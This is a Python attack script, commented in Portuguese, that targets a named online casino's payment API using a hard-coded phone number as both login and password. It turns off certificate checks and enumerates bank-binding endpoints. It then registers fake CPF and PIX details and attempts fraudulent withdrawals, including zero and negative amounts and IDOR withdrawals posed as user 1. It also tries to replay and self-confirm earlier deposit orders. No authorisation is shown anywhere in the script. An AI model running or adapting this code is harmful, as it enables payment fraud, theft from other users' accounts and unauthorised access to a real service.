"""
1. Descobre como cadastrar conta bancária
2. Cadastra conta de teste
3. Refaz os testes de saque com conta cadastrada
"""
import ssl, urllib.request, urllib.error, json, time, threading
from datetime import datetime, timezone

ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
BASE  = "https://ds.amizade777.com"
PHONE = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"
PKG   = "com.slots.big"

RESULTS = []

def req(method, path, body=None, token=None, extra_headers=None):
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json, */*",
         "Origin":BASE,"Referer":BASE+"/"}
    if body is not None: h["Content-Type"] = "application/json"
    if token: h["Token"] = str(token)
    if extra_headers: h.update(extra_headers)
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(BASE+path, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8","ignore")
            try: return resp.status, dict(resp.headers), json.loads(raw)
            except: return resp.status, dict(resp.headers), {"_raw": raw[:600]}
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, {}, json.loads(raw)
        except: return e.code, {}, {"_raw": raw[:400]}
    except Exception as ex:
        return 0, {}, {"err": str(ex)}

def login():
    pl = {"appChannel":"pc","appPackageName":PKG,"deviceId":DID,
          "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0",
          "sysTimezone":None,"sysLanguage":None,"phone":PHONE,"password":PHONE}
    st,_,b = req("POST", "/prod-api/player/sign-in", pl)
    if b.get("code") != 200: raise RuntimeError(f"Login falhou: {b.get('msg')}")
    return b["data"]["token"], b["data"]["user_info"]

def rec(cat, test, rq, rs, interp, sev="info"):
    icons = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🔵","info":"⚪"}
    e = {"ts":datetime.now(timezone.utc).isoformat(),"cat":cat,"test":test,
         "rq":rq,"rs":rs,"interp":interp,"sev":sev}
    RESULTS.append(e)
    code = rs.get("code","?") if isinstance(rs,dict) else "?"
    msg  = str(rs.get("msg",""))[:60] if isinstance(rs,dict) else ""
    print(f"  {icons.get(sev,'⚪')} [{cat}/{test[:55]}] code={code} msg={msg!r}")
    if sev in ("critical","high"): print(f"     ↪ {interp}")

# ─── 1. Descobrir endpoints de banco ─────────────────────────

print("=" * 60)
print("1. DESCOBRIR ENDPOINTS DE CONTA BANCÁRIA")
print("=" * 60)

tok, _ = login()

bank_endpoints = [
    ("GET",  "/prod-api/pay-service/bank"),
    ("POST", "/prod-api/pay-service/bank"),
    ("GET",  "/prod-api/bank/list"),
    ("POST", "/prod-api/bank/list"),
    ("GET",  "/prod-api/bank/info"),
    ("POST", "/prod-api/bank/info"),
    ("POST", "/prod-api/pay-service/bank/add"),
    ("POST", "/prod-api/pay-service/bank/bind"),
    ("POST", "/prod-api/bank/add"),
    ("POST", "/prod-api/bank/bind"),
    ("POST", "/prod-api/pay-service/bind-bank"),
    ("POST", "/prod-api/bank/bindBank"),
    ("POST", "/prod-api/player/bank"),
    ("POST", "/prod-api/player/bindBank"),
    ("POST", "/prod-api/pay-account/bind"),
    ("POST", "/prod-api/pay-account/add"),
    ("GET",  "/prod-api/pay-account/list"),
    ("GET",  "/japi/user/bank"),
    ("POST", "/japi/user/bank/add"),
    ("POST", "/japi/user/bank/bind"),
    ("GET",  "/japi/user/bank/list"),
]

body_default = {"appPackageName": PKG, "appVersion": "1.0.0"}

for method, path in bank_endpoints:
    b = body_default if method == "POST" else None
    st, _, resp = req(method, path, b, tok)
    code = resp.get("code") if isinstance(resp,dict) else None
    if code not in (None, 404, 405):
        print(f"  [{method:5} {st}] {path:50} code={code} msg={str(resp.get('msg',''))[:50]!r}")
        if code == 200 and resp.get("data"):
            print(f"    DATA: {json.dumps(resp['data'], ensure_ascii=False)[:300]}")
    time.sleep(0.3)

# ─── 2. Tentar cadastrar conta bancária PIX ──────────────────

print("\n" + "=" * 60)
print("2. CADASTRAR CONTA BANCÁRIA (PIX)")
print("=" * 60)

tok, _ = login()

# Payload típico de cadastro de banco em cassinos online asiáticos
bank_payloads = [
    # CPF + banco
    {"cpf": "12345678901", "bankName": "Nubank", "bankCode": "260",
     "accountNumber": "12345678901", "accountType": "CPF",
     "realName": "Teste Usuario"},
    # PIX direto
    {"pixKey": PHONE, "pixKeyType": "phone",
     "realName": "Teste Usuario", "cpf": "12345678901"},
    # Variante 2
    {"phone": PHONE, "realName": "G137027",
     "bankCard": "12345678901", "bankName": "PIX"},
    # Variante 3 (aphrodite usa pay_account)
    {"email": "test@test.com", "phone": PHONE,
     "name": "G137027"},
    # Variante 4
    {"account": PHONE, "accountType": "3",
     "bankName": "PIX", "realName": "G137027",
     "appPackageName": PKG},
]

added_bank = False
for payload in bank_payloads:
    for path in ["/prod-api/pay-service/bank/add",
                 "/prod-api/pay-service/bank",
                 "/prod-api/bank/add",
                 "/prod-api/player/bank",
                 "/prod-api/pay-account/add"]:
        tok2, _ = login()
        payload_with_tok = dict(payload, token=tok2)
        st, _, b = req("POST", path, payload_with_tok, tok2)
        code = b.get("code"); msg = str(b.get("msg",""))[:60]
        if code not in (None, 404, 405, 400, 500):
            print(f"  POST {path}: code={code} msg={msg!r}")
            if code == 200:
                print(f"  ✅ Banco cadastrado!")
                added_bank = True
                break
        time.sleep(0.2)
    if added_bank: break

# ─── 3. Ver se precisa de depósito mínimo antes do saque ─────

print("\n" + "=" * 60)
print("3. VERIFICAR PRÉ-REQUISITOS DO SAQUE")
print("=" * 60)

tok, ui = login()
print(f"recharge_amount: {ui.get('recharge_amount')}")
print(f"withdraw_amount: {ui.get('withdraw_amount')}")
print(f"total_rounds: {ui.get('total_rounds')}")
print(f"withdraw_control: {ui.get('withdraw_control')}")
print(f"withdraw_model: {ui.get('withdraw_model')}")
print(f"first_rw_reward: {ui.get('first_rw_reward')}")
print(f"s_player: {ui.get('s_player')} c_player: {ui.get('c_player')}")

# Ver config de saque da plataforma
st, _, b = req("POST", "/prod-api/set/get",
               {"appChannel":"pc","appVersion":"1.0.0","appPackageName":PKG})
if b.get("code") == 200:
    d = b.get("data", {})
    print(f"\nConfig da plataforma:")
    print(f"  withdraw_min: {d.get('withdraw_min')}")
    print(f"  withdraw_step: {d.get('withdraw_step')}")
    print(f"  withdraw_fee: {d.get('withdraw_fee')}")
    wc = d.get("withdraw_config", {})
    print(f"  withdraw_config: {wc}")

# ─── 4. Tenta saque com configurações diferentes ─────────────

print("\n" + "=" * 60)
print("4. VETORES DE SAQUE APÓS ENTENDER O FLUXO")
print("=" * 60)

# O código 103007 = "conta bancária não cadastrada"
# Precisa cadastrar banco ANTES
# Alternativa: testar o endpoint de saque com dados de banco inline

tok, _ = login()

saque_with_bank = [
    # Saque com dados bancários inline
    {"amount": 50, "bankCard": PHONE, "bankName": "PIX",
     "realName": "G137027", "cpf": "12345678901"},
    {"amount": 50, "pixKey": PHONE, "pixKeyType": "PHONE",
     "realName": "G137027"},
    {"amount": 50, "account": PHONE, "accountType": "3"},
    # Saque de valor 0 (para ver se passa o banco mas bloqueia o amount)
    {"amount": 0, "bankCard": PHONE, "bankName": "PIX"},
    # Saque negativo
    {"amount": -50, "bankCard": PHONE, "bankName": "PIX"},
    # Saque com IDOR (sacar em nome de outro usuário)
    {"amount": 50, "userId": 1, "bankCard": PHONE, "bankName": "PIX"},
    {"amount": 50, "user_id": 1, "bankCard": PHONE, "bankName": "PIX"},
]

for i, extra in enumerate(saque_with_bank):
    tok2, _ = login()
    payload = dict(extra, token=tok2, appPackageName=PKG, appVersion="1.0.0")
    st, _, b = req("POST", "/prod-api/payment/balance-less", payload, tok2)
    code = b.get("code"); msg = str(b.get("msg",""))[:60]
    label = f"saque_{i}"
    if code not in (103007, 400, 401, 403, 404, 405, None):
        rec("withdraw_bank", label,
            {"extra": {k:v for k,v in extra.items() if k != "token"}},
            {"code": code, "msg": msg, "data": b.get("data")},
            f"Código diferente: {code}",
            "critical" if code == 200 else "medium")
    else:
        print(f"  [{label}] code={code} msg={msg!r}")
    time.sleep(0.5)

# ─── 5. Testar replay de orderId (do depósito anterior) ──────

print("\n" + "=" * 60)
print("5. REPLAY DE ORDENS DE DEPÓSITO")
print("=" * 60)

# Carrega os orderIds gerados anteriormente
try:
    with open("dep_saque_resultados.json", encoding="utf-8") as f:
        prev = json.load(f)
    order_ids = []
    for e in prev:
        rs = e.get("rs", {})
        if isinstance(rs, dict) and isinstance(rs.get("data"), dict):
            oid = rs["data"].get("orderId")
            if oid: order_ids.append(oid)
    print(f"  OrderIds anteriores: {order_ids}")
except Exception as ex:
    print(f"  [sem dados anteriores: {ex}]")
    order_ids = []

# Tenta verificar o status de uma ordem
if order_ids:
    tok2, _ = login()
    for oid in order_ids[:3]:
        for path in [f"/prod-api/pay-service/recharge/{oid}",
                     f"/prod-api/pay-service/order/{oid}",
                     f"/prod-api/order/{oid}"]:
            st, _, b = req("GET", path, token=tok2)
            code = b.get("code")
            if code not in (None, 404, 405):
                print(f"  GET {path}: code={code} data={b.get('data')}")
        # Tenta cancelar/completar a ordem
        tok3, _ = login()
        st, _, b = req("POST", "/prod-api/pay-service/recharge/confirm",
                       {"orderId": oid, "status": 1, "token": tok3}, tok3)
        code2 = b.get("code")
        if code2 not in (None, 404, 405):
            print(f"  Confirm {oid}: code={code2} msg={b.get('msg')!r}")

# Salvar
with open("saque_banco_resultados.json","w",encoding="utf-8") as f:
    json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

crits = [e for e in RESULTS if e["sev"] in ("critical","high","medium")]
print(f"\n{'='*60}")
print(f"RESUMO: {len(crits)} achados relevantes")
for e in crits:
    icons = {"critical":"🔴","high":"🟠","medium":"🟡"}
    print(f"  {icons.get(e['sev'],'?')} {e['cat']}/{e['test']}")
    print(f"    {e['interp'][:100]}")
print(f"\n✅ saque_banco_resultados.json")
